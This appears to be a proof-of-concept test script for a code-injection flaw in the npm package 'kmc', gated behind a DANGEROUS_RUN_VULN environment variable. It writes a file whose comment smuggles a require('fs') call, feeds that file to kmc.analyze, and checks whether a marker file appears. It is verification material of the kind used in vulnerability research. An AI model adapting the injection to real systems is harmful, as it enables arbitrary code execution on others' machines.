if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

const fs = require("fs");
let kmc = require("kmc/lib");
const path = "./kmc";
let payload = "red(); require('fs').writeFileSync('" + path + "',``); //";
data = {};
file_exist = fs.existsSync(path);
console.log("a", file_exist);
fs.writeFileSync(
	"./exploit.js",
	"//{requires:[require('fs').writeFileSync('kmc','')]});",
);
try {
	kmc.analyze("./exploit.js");
} catch (e) {}
fs.unlinkSync("./exploit.js");
file_exist = fs.existsSync(path);
fs.unlink(path, function (err) {});
console.log("b", file_exist);

if (file_exist) {
	process.exit(0);
} else {
	process.exit(82);
}
